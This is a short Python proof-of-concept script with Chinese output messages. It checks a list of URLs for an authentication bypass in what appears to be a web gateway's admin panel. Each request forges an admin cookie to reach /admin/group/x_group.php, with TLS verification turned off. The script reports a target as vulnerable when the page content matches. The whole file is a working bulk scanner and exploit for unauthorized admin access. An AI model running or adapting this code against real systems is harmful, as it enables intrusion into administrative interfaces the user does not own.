import requests
requests.packages.urllib3.disable_warnings()
def Poc(url):
    print("开始检测:",url)
    header  = {
        'Cookie': 'gw_admin_ticket=1; admin_id=1'
    }
    Vurl = url + "/admin/group/x_group.php?id=3"
    try:
        req = requests.get(url=Vurl,headers=header,verify=False,timeout=5)
        req = req.text
        if "名字:" in req: 
            print("[+]存在漏洞:",url)
        else:
            print("[-]不存在漏洞:",url)
    except Exception as e:
        print("[*]ERR:",url,e)
def main():
    w = open("./url","r")
    w = w.readlines()
    for url in w:
        url = url.rsplit("\n")[0]
        Poc(url)

main()
